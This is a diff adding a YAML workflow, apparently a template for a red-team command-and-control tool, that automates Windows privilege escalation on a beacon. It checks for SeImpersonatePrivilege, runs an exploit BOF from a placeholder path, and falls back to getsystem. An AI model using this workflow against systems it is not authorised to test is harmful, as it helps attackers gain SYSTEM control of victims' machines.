@@ -1,0 +1,41 @@
+name: Privilege Escalation Workflow
+beacon_id: "YOUR_BEACON_ID_HERE"
+
+actions:
+  # First, run whoami to check current privileges
+  - name: check_privileges
+    type: getuid
+
+  # If output contains SeImpersonatePrivilege, run exploit BOF
+  - name: exploit_impersonate
+    type: bof_string
+    parameters:
+      bof: /path/to/exploit.o
+      entrypoint: go
+      arguments: ""
+    conditions:
+      - type: output_check
+        source: check_privileges
+        operator: contains
+        value: SeImpersonatePrivilege
+        case_sensitive: false
+    on_success:
+      # After successful exploit, verify we got SYSTEM
+      - name: verify_system
+        type: getuid
+
+    on_failure:
+      # If exploit fails, try getsystem
+      - name: fallback_getsystem
+        type: getsystem
+
+  # Sleep for 5 seconds before next action
+  - name: wait
+    type: sleep
+    parameters:
+      duration: 5s
+    conditions:
+      - type: output_check
+        source: exploit_impersonate
+        operator: contains
+        value: success
